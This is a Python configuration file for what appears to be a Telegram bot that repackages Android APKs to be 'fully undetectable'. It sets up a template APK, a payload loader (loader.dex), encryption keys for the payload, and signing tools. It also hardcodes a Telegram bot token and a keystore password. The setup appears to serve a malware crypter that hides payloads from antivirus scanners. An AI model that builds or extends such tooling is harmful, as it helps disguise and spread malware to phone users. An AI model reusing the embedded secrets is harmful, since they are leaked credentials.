import os

BOT_TOKEN = "8902950524:AAFxUFbICKx4sm5JM-WGudYOSfjR3w59_Dk"

_HOME = os.path.expanduser("~")
_HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(_HOME, "tools")

JAVA_BIN      = os.path.join(TOOLS_DIR, "jre", "bin", "java")
ECJ_JAR       = os.path.join(TOOLS_DIR, "ecj.jar")
APKTOOL_JAR   = os.path.join(TOOLS_DIR, "apktool.jar")
BT_DIR        = os.path.join(TOOLS_DIR, "build-tools")
APKSIGNER_BIN = os.path.join(BT_DIR, "apksigner")
ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
D8_BIN        = os.path.join(BT_DIR, "d8")
ANDROID_JAR   = os.path.join(TOOLS_DIR, "platforms", "android-34", "android.jar")

KEYSTORE_PATH = os.path.join(TOOLS_DIR, "release_play.p12")
KEYSTORE_PASS = "fudbot123"
KEY_ALIAS     = "androidkey"

WORK_DIR = os.path.join(_HOME, "fud_workspace")

# Template APK = GitHub repo root me main.py ke saath rakho
TEMPLATE_APK = os.path.join(_HERE, "template.apk")

LOADER_SRC_DIR = os.path.join(TOOLS_DIR, "loader_src")
LOADER_DEX     = os.path.join(TOOLS_DIR, "loader.dex")

PAYLOAD_KEY1 = bytes([
    0x5A, 0x1F, 0x9C, 0x42, 0xE7, 0x88, 0x33, 0xBB,
    0x2D, 0x74, 0x6A, 0xC5, 0x01, 0x9E, 0x4F, 0x8A,
])
PAYLOAD_KEY2 = bytes([
    0xAB, 0x72, 0x0D, 0x66, 0xF3, 0x11, 0xE4, 0x58,
    0x9C, 0x30, 0x7F, 0xD2, 0x4B, 0x88, 0x25, 0xE1,
])
PAYLOAD_ROT = 7

URL_JRE        = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jre_x64_linux_hotspot_17.0.11_9.tar.gz"
URL_ECJ        = "https://repo1.maven.org/maven2/org/eclipse/jdt/ecj/3.33.0/ecj-3.33.0.jar"
URL_APKTOOL    = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
URL_BUILDTOOLS = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
